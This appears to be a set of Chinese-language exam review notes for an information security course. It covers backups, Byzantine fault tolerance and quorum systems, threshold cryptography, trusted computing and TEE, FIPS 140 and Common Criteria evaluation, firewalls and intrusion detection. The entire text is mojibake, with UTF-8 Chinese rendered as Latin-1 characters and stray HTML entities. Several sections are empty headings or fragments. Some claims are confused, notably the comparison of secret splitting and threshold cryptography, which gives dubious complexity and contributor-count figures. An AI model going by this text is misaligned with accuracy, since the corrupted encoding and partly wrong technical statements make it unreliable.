ä»¥ç½‘ç»œæ¢å¤ä¸ºç›®æ ‡NROï¼ˆNetwork Recovery Objectï¼‰ ï¼›
ä»¥æœåŠ¡æ”¯æŒèƒ½åŠ›ä¿è¯ä¸ºç›®æ ‡DOO ï¼ˆServiceability Degrade Objectï¼‰ (é™çº§è¿ä½œç›®æ ‡)
10.4 æ•°æ®å¤‡ä»½ç­–ç•¥çš„åŒºåˆ«å’Œè”ç³»ï¼šå®Œå…¨å¤‡ä»½ã€å¢é‡å¤‡ä»½å’Œå·®é‡å¤‡ä»½å®Œå…¨å¤‡ä»½ï¼šå¯¹ç³»ç»Ÿè¿›è¡Œå®Œå…¨å¤‡ä»½ï¼Œä¼˜ç‚¹æ˜¯ç›´è§‚ï¼Œç¼ºç‚¹æ˜¯æ•°æ®é‡å¤é‡å¤§ï¼Œæˆæœ¬é«˜ï¼Œæ•ˆç‡ä½
å¢é‡å¤‡ä»½ï¼šåªå¤‡ä»½ä¸Šä¸€æ¬¡å¤‡ä»½åæ•°æ®çš„æ”¹å˜é‡ï¼Œä¼˜ç‚¹æ•°æ®é‡å¤é‡å°‘ï¼ŒèŠ‚çº¦ç©ºé—´ï¼Œç¼©çŸ­æ—¶é—´ï¼Œç¼ºç‚¹ï¼Œå¯é æ€§å·®ï¼Œå„ä¸ªå¤‡ä»½ç¯ç¯ç›¸è¿ï¼Œä»»ä½•ä¸€ç¯å‡ºé—®é¢˜ï¼Œéƒ½ä¼šå½±å“æ•´ä¸ªå¤‡ä»½é“¾
 å·®é‡å¤‡ä»½ï¼šå·®é‡å¤‡ä»½çš„æ•°æ®æ˜¯ä¸Šä¸€æ¬¡å…¨å¤‡ä»½ä¹‹åæ–°å¢åŠ å’Œä¿®æ”¹è¿‡çš„æ•°æ®ï¼Œä¾‹å¦‚æ¯å‘¨å‘¨ä¸€å…¨å¤‡ä»½ï¼Œä¹‹åå·®é‡å¤‡ä»½ï¼Œå…¼å…·å‰ä¸¤è€…çš„ä¼˜ç‚¹
æ€è€ƒé¢˜
ç¬¬åä¸€æ¬¡è¯¾ï¼šæ‹œå åº­å®¹é”™ç³»ç»Ÿ11.1 n&#x3D;4ï¼Œm&#x3D;1ï¼Œå£å¤´æ¶ˆæ¯çš„æ‹œå åº­æ¶ˆæ¯åå•†è¿‡ç¨‹ï¼›https://blog.csdn.net/xuyuzhuang1991/article/details/79638051
11.2 masking BQSçš„å®¹é”™æ¡ä»¶ï¼ŒåŠå…¶ä¸€è‡´æ€§è¿‡ç¨‹åˆ†æâ€‹    å‡è®¾ï¼š




â€‹        åœ¨BQSä¸­ï¼Œç”±äºæ— æ³•åŒºåˆ†ä¿¡é“&#x2F;æœåŠ¡å™¨å¤±æ•ˆï¼ŒåŒä¸€å½’ç»“åˆ°æœåŠ¡å™¨å¤±æ•ˆ
â€‹        Reliable but Asynchronousï¼ˆå¼‚æ­¥ï¼‰ï¼šä¿è¯å¯ä»¥ä¼ è¾“åˆ°è¾¾ï¼Œä½†ä¸å¯¹ä¼ è¾“æ—¶é—´åšä¿è¯






æœåŠ¡å™¨æ•°é‡:n
æ³•å®šäººæ•°,quorumæ•°é‡,å³è‡³å°‘æ­£å¸¸çš„æ•°é‡:q
å¤±æ•ˆçš„serveræ•°é‡:f
å¯ç”¨æ€§Availability
â€‹        ä»»ä½•æƒ…å†µä¸‹ï¼Œæ€»æ˜¯ä¼šæœ‰Quorumæ¥é…åˆClientæ“ä½œï¼Œå› æ­¤n-f &gt;&#x3D; q
ä¸€è‡´æ€§Consistency
â€‹        è¯»å‡ºçš„ç»“æœï¼Œæ˜¯æœ€è¿‘ä¸€æ¬¡å†™å…¥çš„ç»“æœï¼Œæœ€å·®æƒ…å†µä¸‹ï¼Œè¯»å‡ºçš„ç»“æœä¸ºq-ï¼ˆn-qï¼‰
â€‹        å…¶ä¸­è‡³å°‘æœ‰2f+1å°æ­£ç¡®æœåŠ¡å™¨ï¼ˆæ­£ç¡®çš„æœåŠ¡å™¨æ¯”å¤±æ•ˆçš„å¤šï¼‰ï¼Œå› æ­¤2q-n&gt;&#x3D;2f+1
â€‹    
â€‹    nè‡³å°‘æ˜¯4f+1ï¼Œqè‡³å°‘æ˜¯3f+1ï¼Œnä¸ºæ‰€æœ‰æœåŠ¡å™¨æ•°é‡ï¼Œqä¸ºQuorumï¼ˆå†™å…¥å’Œè¯»å‡ºçš„qä¸€è‡´ï¼‰ï¼Œfä¸ºå¤±æ•ˆæœåŠ¡å™¨çš„æ•°é‡
è®©ä½ è®¾è®¡ä¸€ä¸ªå®¹é”™çš„ç³»ç»Ÿ???é’ˆå¯¹å£å¤´æ¶ˆæ¯ï¼Œæè¿°n&#x3D;7, m&#x3D;2çš„BGPåè®®è¿‡ç¨‹
ç¬¬åäºŒæ¬¡è¯¾: é—¨é™å¯†ç å­¦12.1 å¯†ç æ‹†åˆ†ä¸é—¨é™å¯†ç çš„åŒºåˆ«å’Œè”ç³»ç§˜å¯†åˆ†äº«å’Œé—¨é™å¯†ç ä¸ä¸€æ ·
é—¨é™å¯†ç å¼ºè°ƒè®¡ç®—è¿‡ç¨‹çš„æ‹†åˆ†,ç§˜å¯†ä¸ä¼šå®Œæ•´çš„å‡ºç°åœ¨å†…å­˜ç©ºé—´
ç§˜å¯†åˆ†äº«ä¼šåˆæˆå‡ºæ¥
éƒ½æœ‰å¯ç”Ÿå­˜ç‰¹æ€§, é—¨é™å¯†ç ä¿æŠ¤å¯†é’¥,
ä¸€ä¸ªå®ä½“å‘èµ·æˆ–æ‰§è¡Œçš„å¯†ç æ“ä½œï¼Œåˆ†æ•£åˆ°å¤šä¸ªå®ä½“ç»„æˆçš„ä¸€ä¸ªç¾¤ä½“æ¥æ‰§è¡Œã€‚åŸºç¡€æ˜¯ç§˜å¯†åˆ†äº«æœºåˆ¶ï¼Œå¯¹å…±äº«ç§˜å¯†è¿›è¡Œé‡æ„æ—¶ï¼Œå¤§äºç­‰äºé—¨é™å€¼ä¸ªæ•°çš„å®ä½“åˆä½œæ¢å¤å‡ºç§˜å¯†ï¼Œå¯¹äºæ“ä½œï¼ˆå¦‚ç­¾åæˆ–åŠ å¯†ï¼‰ï¼Œå¯ä»¥åœ¨ä¸å‡ºç°å…±äº«ç§˜å¯†çš„æƒ…å†µä¸‹åˆä½œå®Œæˆæœ€ç»ˆç»“æœçš„ç”Ÿæˆã€‚
å¯†ç æ‹†åˆ†å’Œé—¨é™å¯†ç éƒ½æ˜¯ç”¨äºå°†ä¸€ä¸ªå¯†ç åˆ†æˆå¤šä¸ªåˆ†ç‰‡ï¼Œä»¥ä¾¿è¾¾åˆ°æ›´é«˜çš„å®‰å…¨æ€§ã€‚ä½†æ˜¯ï¼Œå®ƒä»¬ä¹‹é—´æœ‰ä¸€äº›åŒºåˆ«ï¼š

åŸç†ä¸åŒï¼šå¯†ç æ‹†åˆ†æ˜¯é€šè¿‡å°†å¯†ç è¡¨ç¤ºæˆå¤šé¡¹å¼çš„å½¢å¼ï¼Œç„¶åæ±‚å€¼åœ¨è‹¥å¹²ä¸ªç‚¹ä¸Šï¼Œå¾—åˆ°è‹¥å¹²ä¸ªå€¼ï¼Œè¿™äº›å€¼å°±æ˜¯å¯†ç çš„åˆ†ç‰‡ã€‚è€Œé—¨é™å¯†ç æ˜¯é€šè¿‡å¯¹å¯†ç è¿›è¡Œçº¿æ€§è¿ç®—å¾—åˆ°çš„ã€‚
è¿ç®—å¤æ‚åº¦ä¸åŒï¼šå¯†ç æ‹†åˆ†çš„è¿ç®—å¤æ‚åº¦ä¸º O(n^2)ï¼Œå…¶ä¸­ n æ˜¯æ±‚å€¼ç‚¹çš„æ•°é‡ã€‚è€Œé—¨é™å¯†ç çš„è¿ç®—å¤æ‚åº¦ä¸º O(n)ã€‚
æ¢å¤å¯†ç æ‰€éœ€çš„è´¡çŒ®è€…æ•°é‡ä¸åŒï¼šå¯†ç æ‹†åˆ†éœ€è¦è‡³å°‘ n ä¸ªè´¡çŒ®è€…æ¢å¤å¯†ç ï¼Œå…¶ä¸­ n æ˜¯æ±‚å€¼ç‚¹çš„æ•°é‡ã€‚è€Œé—¨é™å¯†ç å¯ä»¥åœ¨ t ä¸ªè´¡çŒ®è€…ä¸­çš„ä»»æ„ t ä¸ªè´¡çŒ®è€…æ¢å¤å¯†ç ã€‚

å¯†ç æ‹†åˆ†å’Œé—¨é™å¯†ç éƒ½æ˜¯ç”¨äºæé«˜å¯†ç çš„å®‰å…¨æ€§çš„æ–¹æ³•ï¼Œä½†æ˜¯å®ƒä»¬çš„åŸç†ã€è¿ç®—å¤æ‚åº¦å’Œæ¢å¤å¯†ç æ‰€éœ€çš„è´¡çŒ®è€…æ•°é‡éƒ½ä¸åŒã€‚
12.2 æ‹‰æ ¼æœ—æ—¥å·®å€¼ç§˜å¯†æ‹†åˆ†æ–¹æ¡ˆåˆ©ç”¨å¤šé¡¹å¼æ›²çº¿çš„ç§˜å¯†åˆ†äº«




12.3 RSAé—¨é™å¯†ç å®æ–½è¿‡ç¨‹åŠ æ³•çš„ä»€ä¹ˆä»€ä¹ˆ.. ä¹˜æ³•çš„å°±ç®—äº†
æ¯”å¦‚ç»™ä½ æ¥è®¡ç®—æ€ä¹ˆæ‹†åˆ†
12.4 ä½¿ç”¨proactive recoveryå¯¹æŠ— mobile adversaryçš„åŸºæœ¬åŸç†ä¸¢å¤±äº†ä»½é¢æ€ä¹ˆå¿«é€Ÿåœ°è®©å½±å“æ¶ˆå¤±
ç¬¬åä¸‰æ¬¡è¯¾: è‡ªé‡æ„å¯ä¿¡èµ–ä¸ç»ˆç«¯å®‰å…¨13.1 ç¾å›½æå‡ºçš„æ”¹å˜åšå¼ˆï¼ˆæ¸¸æˆï¼‰è§„åˆ™å®‰å…¨æŠ€æœ¯åŒ…æ‹¬å“ªäº›ï¼Ÿå››ä¸ªå®‰å…¨æŠ€æœ¯,èƒŒæ™¯ã€å†…æ ¸ã€ç›®æ ‡æ˜¯ä»€ä¹ˆ?
13.2 è‡ªé‡æ„å¯ä¿¡èµ–ä¸å…¶å®ƒå®‰å…¨æŠ€æœ¯ç›¸æ¯”æœ€å¤§çš„å®‰å…¨ç‰¹å¾æ˜¯ä»€ä¹ˆï¼Œå…¶å¸¦æ¥çš„å®‰å…¨ä¼˜åŠ¿åˆæ˜¯ä»€ä¹ˆï¼Ÿ
13.3 ç§»åŠ¨ç»ˆç«¯TEEæŠ€æœ¯çš„5ä¸ªåŸºæœ¬å®‰å…¨ç‰¹å¾åŠå…¶å«ä¹‰ã€‚å¯ä¿¡æ‰§è¡Œç¯å¢ƒTEE




ç¬¬åå››æ¬¡è¯¾ï¼šå¯ä¿¡è®¡ç®—å¯ä¿¡è®¡ç®—çš„åŸºæœ¬åŠŸèƒ½ï¼šå…¬é’¥è®¤è¯ã€å®Œæ•´æ€§åº¦é‡ã€è¯æ˜ï¼›CRTMå’ŒDRTMçš„æ¦‚å¿µåŠåŒºåˆ«ï¼›DRTMæ—¨åœ¨å®ç°ä¿¡ä»»æ ¹çš„éšæ—¶éšåœ°å¯åŠ¨ï¼Œä»¥åŠå¯ä¿¡å¯åŠ¨è¿‡ç¨‹çš„å¯é‡å¤

TCGè½¯ä»¶æ ˆTSSçš„åŸºæœ¬æ¶æ„å’Œä½œç”¨ï¼›å¯ä¿¡æ”¯æ’‘è½¯ä»¶æ˜¯æ“ä½œç³»ç»Ÿå±‚é¢å®‰å…¨åº”ç”¨å¯ä»¥è°ƒç”¨å¯ä¿¡è®¡ç®—å¹³å°æä¾›çš„å¯ä¿¡æœåŠ¡æ¥å£ï¼Œä»è€Œä¸ºç”¨æˆ·æä¾›å¯ä¿¡æœåŠ¡ã€‚TSSï¼ˆTCG Software Stackï¼‰æ˜¯å¯ä¿¡è®¡ç®—å¹³å°ä¸ŠTPMçš„æ”¯æ’‘è½¯ä»¶ã€‚ TSS çš„ä½œç”¨ä¸»è¦æ˜¯ä¸ºæ“ä½œç³»ç»Ÿå’Œåº”ç”¨è½¯ä»¶æä¾›ä½¿ç”¨TPMçš„æ¥å£ã€‚ç›®å‰ï¼ŒTSSä¸»è¦æœ‰TSS 1.2å’ŒTSS 2.0ä¸¤ä¸ªç‰ˆæœ¬ã€‚å…¶ä¸­åŸºäºTPM 2.0çš„TSS 2.0æ˜¯æœ€æ–°çš„ç‰ˆæœ¬ã€‚

BIOSå¦‚ä½•ä¸TPMæ¨¡å—äº¤äº’
å®Œæ•´æ€§åº¦é‡çš„åº”ç”¨ï¼Œæ¯”å¦‚åŒºå—é“¾åŒºå—å¤´çš„å®Œæ•´æ€§ä¿æŠ¤åŸç†ç­‰ã€‚tpm(å¯ä¿¡å¹³å°æ¨¡å—):æ˜¯ä¸“é—¨ä¸ºè¿›è¡ŒåŠ å¯†è®¡ç®—è€Œåˆ›å»ºçš„ç¡¬ä»¶ã€‚å®ƒä¸å¤„ç†ç³»ç»Ÿçš„å…¶ä½™éƒ¨åˆ†åœ¨ç‰©ç†ä¸Šéš”ç¦»ï¼Œå¹¶ä¸”é€šå¸¸æ˜¯ä¸»æ¿ä¸Šçš„ä¸€ä¸ªç‹¬ç«‹ ICã€‚ 
tcg :TCGï¼ˆTrusted Computing Grounpï¼‰æ¶æ„-å³ä»å¹³å°æ— å…³è§’åº¦å…¨å±€ä¸Šé˜è¿°äº†å¯ä¿¡å¹³å°æ¨¡å—TPMï¼ˆTrusted Platform Moduleï¼‰çš„æ¶æ„ï¼ŒåŠŸèƒ½ï¼Œä¸»è¦æ¨¡å—ï¼Œå·¥ä½œåŸç†ï¼Œå¯†é’¥ç®¡ç†æ–¹å¼ç­‰ã€‚
tee:æ˜¯èŠ¯ç‰‡ç»„ä¸Šçš„ä¸€ä¸ªåŒºåŸŸï¼Œå…¶å·¥ä½œæ–¹å¼ç±»ä¼¼äº TPMï¼Œä½†å¹¶æœªä¸èŠ¯ç‰‡çš„å…¶ä½™éƒ¨åˆ†ç‰©ç†éš”ç¦»ã€‚
åäº”æ¬¡è¯¾15.1 ä¿¡æ¯å®‰å…¨æµ‹è¯„ä½“ç³»ç»“æ„ï¼›

â€‹		CMVPæœ€åº•å±‚: å¯†ç æ¨¡å—çš„éªŒè¯ä½“ç³»,  ç¬¦åˆFIPSè®¤è¯ä½“ç³»æ ‡å‡†(é€šè¿‡è¿™ä¸ªæ ‡å‡†æ¥æ£€æµ‹æ˜¯å¦ç¬¦åˆæ ‡å‡†)
â€‹		åœ¨è¿™åŸºç¡€ä¸Šåšä¸€äº›å®‰å…¨åŠŸèƒ½: åŸºäºå¯†ç æ¨¡å—çš„åè®®çº§åŠŸèƒ½ protocols
â€‹		æ‰§è¡Œå®‰å…¨åŠŸèƒ½çš„äº§å“,æ¯”å¦‚ä»€ä¹ˆæµè§ˆå™¨,é˜²ç«å¢™ä»€ä¹ˆçš„,æŒ‰ç…§CCæ ‡å‡†æ¥åš å®‰å…¨äº§å“
â€‹		800-37 53 ç³»ç»Ÿçº§å®‰å…¨,ç±»ä¼¼äºæˆ‘å›½çš„ç­‰ä¿
â€‹		å†é€šè¿‡C&amp;A è®¤è¯å’Œè®¤å¯æ¥ä¿è¯æ•´ä¸ªITçš„å®‰å…¨
15.2 å¯†ç æŠ€æœ¯åœ¨ä¿¡æ¯å®‰å…¨å’Œæµ‹è¯„ä½“ç³»ç»“æ„ä¸­çš„ä½œç”¨ï¼›15.3 FIPS å¯†ç æ¨¡å—æµ‹è¯„çš„åŸºæœ¬æ¦‚å¿µï¼Œå¯†ç æ¨¡å—çš„ 4 ä¸ªçº§åˆ«ã€ 5 ä¸ªç±»åˆ«ç­‰FIPS 140åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼šCAVPå’ŒCMVPã€‚å…¶ä¸­CAVPä¸º æœ‰FIPS-approvedæˆ–NIST-recommendedçš„å¯†ç ç®—æ³•ä»¥ åŠå®ƒä»¬çš„ç»„ä»¶è¿›è¡ŒéªŒè¯ï¼Œä¸”ç®—æ³•é€šè¿‡CAVPéªŒè¯æ˜¯æ•´ä¸ªæ¨¡å—é€šè¿‡CMVPçš„å‰ç½®æ¡ä»¶ã€‚CMVPæŒ‰ç…§FIPS140æ ‡å‡†è¿›è¡Œæ¨¡å—æ£€æµ‹ã€‚
5ç§ç±»å‹ï¼Œä¹Ÿç§°å¯†ç æ¨¡å—å½¢æ€ï¼šÂ· ç¡¬ä»¶å¯†ç æ¨¡å—ï¼šå¯†ç è¾¹ç•Œè§„å®šä¸ºç¡¬ä»¶è¾¹çº¿ã€‚åœ¨ç¡¬ä»¶è¾¹ç•Œå†…å¯ä»¥åŒ…å«å›ºä»¶å’Œ&#x2F;æˆ– è½¯ä»¶ï¼Œå…¶ä¸­è¿˜å¯ä»¥åŒ…æ‹¬æ“ä½œç³»ç»Ÿã€‚ 
Â· è½¯ä»¶å¯†ç æ¨¡å—ï¼šå¯†ç è¾¹ç•Œä¸ºæ‰§è¡Œåœ¨å¯ä¿®æ”¹çš„è¿è¡Œç¯å¢ƒä¸­çš„çº¯è½¯ä»¶éƒ¨ä»¶ï¼ˆå¯ä»¥æ˜¯ ä¸€ä¸ªæˆ–å¤šä¸ªè½¯ä»¶éƒ¨ä»¶ï¼‰å’Œæ•°æ®ç»„ä»¶ã€‚è½¯ä»¶å¯†ç æ¨¡å—çš„è¿è¡Œç¯å¢ƒæ‰€åŒ…å«çš„è®¡ç®— å¹³å°å’Œæ“ä½œç³»ç»Ÿï¼Œåœ¨å®šä¹‰çš„å¯†ç è¾¹ç•Œä¹‹å¤–ã€‚
Â· å›ºä»¶å¯†ç æ¨¡å—ï¼šå¯†ç è¾¹ç•Œä¸ºæ‰§è¡Œåœ¨å—é™çš„æˆ–ä¸å¯ä¿®æ”¹çš„è¿è¡Œç¯å¢ƒä¸­çš„çº¯å›ºä»¶ éƒ¨ä»¶åˆ’å®šç•Œçº¿ã€‚å›ºä»¶å¯†ç æ¨¡å—çš„è¿è¡Œç¯å¢ƒæ‰€åŒ…å«çš„è®¡ç®—å¹³å°å’Œæ“ä½œç³»ç»Ÿï¼Œåœ¨å®šä¹‰çš„å¯†ç è¾¹ç•Œä¹‹å¤–ï¼Œä½†æ˜¯ä¸å›ºä»¶æ¨¡å—æ˜ç¡®ç»‘å®šã€‚å—é™è¿è¡Œç¯å¢ƒæŒ‡å…è®¸å—æ§æ›´ æ”¹çš„è½¯ä»¶æˆ–è€…å›ºä»¶æ¨¡å—,å¦‚ Java å¡ä¸­çš„Java è™šæ‹Ÿæœº
Â· æ··åˆè½¯ä»¶æ¨¡å—ï¼šå¯†ç è¾¹ç•Œä¸ºè½¯ä»¶éƒ¨ä»¶å’Œä¸ç›¸äº¤çš„ç¡¬ä»¶éƒ¨ä»¶ï¼ˆå³è½¯ä»¶éƒ¨ä»¶ä¸åœ¨ ç¡¬ä»¶æ¨¡å—è¾¹ç•Œä¸­ï¼‰çš„é›†åˆåˆ’å®šç•Œçº¿ã€‚è½¯ä»¶è¿è¡Œçš„ç¯å¢ƒæ‰€åŒ…å«çš„è®¡ç®—å¹³å°å’Œæ“ä½œ ç³»ç»Ÿï¼Œåœ¨å®šä¹‰çš„æ··åˆè½¯ä»¶æ¨¡å—è¾¹ç•Œä¹‹å¤–ã€‚
Â· æ··åˆå›ºä»¶æ¨¡å—ï¼šå¯†ç è¾¹ç•Œä¸ºå›ºä»¶éƒ¨ä»¶å’Œä¸ç›¸äº¤çš„ç¡¬ä»¶éƒ¨ä»¶ï¼ˆå³å›ºä»¶éƒ¨ä»¶ä¸åœ¨ ç¡¬ä»¶æ¨¡å—è¾¹ç•Œä¸­ï¼‰çš„åˆæˆåˆ’å®šç•Œçº¿ã€‚å›ºä»¶è¿è¡Œçš„ç¯å¢ƒæ‰€åŒ…å«çš„è®¡ç®—å¹³å°å’Œæ“ä½œç³»ç»Ÿï¼Œåœ¨å®šä¹‰çš„æ··åˆå›ºä»¶æ¨¡å—è¾¹ç•Œä¹‹å¤–ï¼Œä½†æ˜¯ä¸æ··åˆå›ºä»¶æ¨¡å—æ˜ç¡®ç»‘å®šã€‚ 
4ä¸ªçº§åˆ«ï¼ˆç¡¬ä»¶4çº§ï¼Œè½¯ä»¶ç›´è§‚ä¸Šåªæœ‰2çº§ï¼‰ï¼šÂ· 1çº§ï¼šæ™®é€šçš„å¯†ç äº§å“+è‡ªæµ‹è¯•
Â· 2çº§ï¼š1çº§çš„äº§å“+é˜²æ‹†æµ‹å°æ¡+ï¼ˆæ˜ç¡®çš„è§’è‰²é‰´åˆ«ï¼‰
Â· 3çº§ï¼š2çº§çš„äº§å“+æ‹†é™¤å“åº”+EFP&#x2F;EFT+å¯ä¿¡ä¿¡é“+éå…¥ä¾µå¼ å®‰å…¨
Â· 4çº§ï¼š3çº§çš„äº§å“+å“åº”å°å¥—  
 æµ‹è¯•é’ˆå¯¹æ¯ä¸€ä¸ªåŸŸçš„å®‰å…¨è¦æ±‚è¿›è¡Œï¼Œæœ€åé’ˆå¯¹å„ä¸ªåŸŸçš„è¯„çº§ä¸­è·å¾—çš„æœ€ä½è¯„çº§ä½œä¸ºæ•´ä½“è¯„çº§ï¼Œè¦æ±‚å¦‚ä¸‹ï¼š
1.åœ¨æ¯ä¸€ä¸ªåŸŸä¸­ç‹¬ç«‹åœ°è¯„çº§
2.åæ˜ äº†æ¨¡å—èƒ½æ»¡è¶³é‚£ä¸ªåŸŸä¸­æ‰€æœ‰è¦æ±‚çš„æœ€å¤§çº§åˆ«
3.é™¤â€œè¿è¡Œç¯å¢ƒâ€ï¼ˆä¸é€‚ç”¨äºç¡¬ä»¶å¯†ç æ¨¡å—ï¼‰ã€â€œ ç‰©ç†å®‰å…¨â€ï¼ˆä¸é€‚ç”¨äºè½¯ä»¶å¯†ç æ¨¡å—ï¼‰ã€â€œå…¶ä»– æ”»å‡»çš„ç¼“è§£â€ç­‰3ä¸ªå®‰å…¨åŸŸå¤–ï¼Œå…¶å®ƒçš„å®‰å…¨åŸŸéƒ½ æ˜¯å¿…é€‰æ£€æµ‹é¡¹ç›®
4.ä¸èƒ½åªé€‰éƒ¨åˆ†å®‰å…¨åŸŸåšæ£€æµ‹ã€‚
5.å¦‚æœä¸€ä¸ªåŸŸæ²¡æœ‰æä¾›ä¸åŒå®‰å…¨çº§åˆ«çš„è¦æ±‚ï¼Œåˆ™è¯„ çº§ä¸æ¨¡å—æ•´ä½“å®‰å…¨çº§åˆ«ç›¸å½“  
æœ€åé’ˆå¯¹å„ä¸ªåŸŸçš„è¯„çº§ä¸­è·å¾—çš„æœ€ä½è¯„çº§ä½œä¸ºæ•´ä½“è¯„çº§ã€‚
15.4 CC æ£€æµ‹çš„åŸºæœ¬æ¦‚å¿µï¼Œ åŒ…æ‹¬ SFRã€ SARã€ EAL ç­‰ï¼› ST å’Œ PP çš„åŒºåˆ«å’Œè”ç³»ï¼ŒCCæ˜¯é€šç”¨è¯„ä¼°å‡†åˆ™ï¼Œæ˜¯æè¿°äº§å“ä¿¡æ¯å®‰å…¨è¦æ±‚çš„é€šç”¨ç»“æ„å’Œè¯­è¨€ï¼Œå«æœ‰æ ‡å‡†åŒ–çš„ä¿¡æ¯å®‰å…¨è¦æ±‚ç»„ä»¶å’ŒæŠ¥çš„ç›®å½•ã€‚CCç”¨äºå¼€å‘ä¿æŠ¤è½®å»“ï¼ˆPPï¼‰å’Œå®‰å…¨ç›®æ ‡ï¼ˆSTï¼‰ï¼Œå³ç‰¹å®šäº§å“çš„ä¿¡æ¯å®‰å…¨è¦æ±‚å’Œè§„èŒƒï¼Œé’ˆå¯¹å·²çŸ¥çš„ä¿¡æ¯å®‰å…¨è¦æ±‚è¯„ä¼°äº§å“å’Œç³»ç»Ÿã€‚

å…¶ä¸­å®‰å…¨åŠŸèƒ½è¦æ±‚ï¼ˆSFRï¼‰ç”¨äºå®šä¹‰å®‰å…¨ä¿¡æ¯äº§å“çš„å®‰å…¨åŠŸèƒ½ï¼Œæè¿°ä¿¡æ¯ç³»äº§å“æä¾›çš„å®‰å…¨æœåŠ¡çš„è¦æ±‚ã€‚

å®‰å…¨ä¿éšœè¦æ±‚ï¼ˆSARï¼‰ç”¨äºç¡®ä¿ä¿¡æ¯äº§å“çš„å®‰å…¨åŠŸèƒ½å¯ä»¥è¢«æœ‰ä¿éšœåœ°å®æ–½ã€‚

EALæ˜¯è¯„ä¼°ä¿è¯çº§ï¼Œéšç€ç­‰çº§æå‡ï¼Œå®‰å…¨ä¿éšœçš„è¦æ±‚ä»å°‘åˆ°å¤šã€ç”±æ¾åˆ°ç´§é€’å¢ï¼Œæ¯ä¸ªè¯„ä¼°ä¿éšœçº§éƒ½æ˜¯å°†å®‰å…¨ä¿éšœè¦æ±‚çš„ç»†èŠ‚æŒ‰ä¸€å®šæ–¹å¼æ­é…å¹¶å›ºå®šä¸‹æ¥ã€‚

STæ˜¯ å¯¹æŸä¸ªç‰¹å®šçš„è¯„ä¼°ç›®æ ‡TOEæå‡ºçš„è¦å…¶ æ»¡è¶³çš„å®‰å…¨åŠŸèƒ½è¦æ±‚ï¼ˆSecurity Functional Requirementsï¼‰å’Œå®‰å…¨ä¿éšœè¦æ±‚ï¼ˆSecurity Assurance Requirementsï¼‰ã€‚

ä¿æŠ¤è½®å»“PPæ˜¯å¯¹æŸä¸€ç±»äº§å“æå‡ºçš„å®‰å…¨åŠŸèƒ½å’Œå®‰å…¨ä¿ éšœè¦æ±‚ã€‚


STç›¸å½“äºäº§å“å®ç°æ–¹æ¡ˆï¼Œä¸å®ç°ç›¸å…³ï¼Œä½œè€…å¯èƒ½æ˜¯ä¿¡æ¯å®‰å…¨äº§å“å‚å•†ã€å¼€å‘è€…æˆ–è€…é›†æˆå•†ã€‚PPç›¸å½“äºäº§å“æ ‡å‡†ï¼Œä¸å®ç°æ— å…³ï¼ˆå¤šä¸ªå…·ä½“å®ç°å¯èƒ½æ»¡è¶³åŒä¸€ä¸ªPPè¦æ±‚ï¼‰ï¼Œæè¿°ç”¨æˆ·å¯¹è¿™ç±»äº§å“çš„å®‰å…¨è¦æ±‚ï¼Œä½œè€…å¯èƒ½æ˜¯ä¿¡æ¯äº§å“çš„ç”¨æˆ·æˆ–å‚å•†ã€‚
å†å²è€ƒé¢˜(æ ¹æ®å­¦é•¿å­¦å§å›å¿†)çŠ¶æ€æ£€æµ‹é˜²ç«å¢™çš„åŸç†é€šè¿‡å¯¹è¿æ¥çš„è·Ÿè¸ªåŠŸèƒ½,å®ç°å¯¹æ•°æ®åŒ…çŠ¶æ€ç›‘æµ‹,ä»è€Œè¿›è¡Œè¿‡æ»¤,
åŒ…è¿‡æ»¤é˜²ç«å¢™:åªæ£€æŸ¥æŠ¥å¤´
çŠ¶æ€æ£€æµ‹é˜²ç«å¢™:æ£€æŸ¥æŠ¥å¤´+å»ºç«‹è¿æ¥çŠ¶æ€è¡¨
åº”ç”¨çº§ç½‘å…³é˜²ç«å¢™:æ£€æŸ¥æŠ¥å¤´ + æ£€æŸ¥æ•°æ®
ä»£ç†æœåŠ¡å™¨å‹é˜²ç«å¢™:


å¼‚å¸¸æ£€æµ‹å’Œè¯¯ç”¨æ£€æµ‹çš„åŒºåˆ«å¼‚å¸¸æ£€æµ‹æ˜¯å»ºç«‹ç”¨æˆ·æ­£å¸¸çš„ä¸€ä¸ªè¡Œä¸ºæ¨¡å¼åº“,ä¸åœ¨è¿™é‡Œé¢çš„åˆ¤å®šä¸ºå¼‚å¸¸çš„è¡Œä¸º
è¯¯ç”¨æ£€æµ‹æ˜¯â€¦
è¯¯ç”¨æ£€æµ‹ çš„æ–°ç‰¹å¾çš„å‘ç°è¿‡ç¨‹å’Œå®ƒçš„è¿è¡Œ(ä½¿ç”¨å·²æœ‰ç‰¹å¾è¿›è¡Œæ£€æµ‹)æ˜¯ç›¸äº’ç‹¬ç«‹çš„,
è€Œå¼‚å¸¸æ£€æµ‹çš„æ¨¡å¼åº“æ›´æ–°é€šå¸¸æ˜¯åœ¨IDSä¸­å®Œæˆ,å³ä¸€è¾¹è¿è¡Œ,ä¸€è¾¹æ›´æ–°
IPSECå’Œsslçš„åŒºåˆ«https://m.yisu.com/ask/3162.html
åº”æ€¥è®¡åˆ’å’Œè¿ç»­æ€§è®¡åˆ’çš„åŒºåˆ«ã€‚APTæ”»å‡»çš„å½±å“ã€‚CCå‡†åˆ™ä¸­stå’Œppçš„åŒºåˆ«ã€‚ä¸€ä¸ªå¤§ç§˜å¯†Kç”±ä¸¤ä¸ªç§˜å¯†så’Œmç»„æˆï¼Œä¸¤ä¸ªå­ç§˜å¯†ä¸å¯ä»¥æš´éœ²ï¼Œåˆ†å‘ç»™nä¸ªäººå¦‚ä½•åˆ†å‘ã€‚ä¸å¯ä»¥ç”¨ocslå’Œä»€ä¹ˆï¼ˆè®°ä¸æ¸…æ¥šäº†ï¼‰ï¼Œä½¿ç”¨rsaé—¨é™ç®—æ³•ï¼Œå’Œç§˜å¯†åˆ†äº«æŠ€æœ¯ã€‚è®¾è®¡ä¸€ä¸ªæœåŠ¡å™¨æ’¤é”€è¯ä¹¦ä¹‹åï¼Œç”¨æˆ·ç«‹åˆ»ä¸å¯ä»¥è¿›è¡Œç­¾åã€‚æè¿°å…¶å…·ä½“è¿‡ç¨‹ã€‚
